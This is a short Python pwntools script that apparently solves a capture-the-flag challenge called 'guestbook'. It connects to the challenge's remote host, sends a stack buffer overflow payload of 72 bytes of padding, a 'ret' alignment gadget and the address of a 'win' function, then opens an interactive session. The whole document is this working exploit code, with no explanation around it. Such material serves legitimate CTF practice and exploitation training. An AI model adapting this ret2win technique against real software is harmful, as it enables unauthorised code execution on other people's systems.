from pwn import *

context.binary=elf=ELF("./guestbook")
p=remote("offsec.m0lecon.it",13510)
offset=64+8
win=elf.sym.win
ret=ROP(elf).find_gadget(['ret'])[0]
payload=flat(
    b"a"*offset,
    p64(ret),
    p64(win)
)
p.recv()
p.sendline(payload)
print(p.recv())
p.interactive()
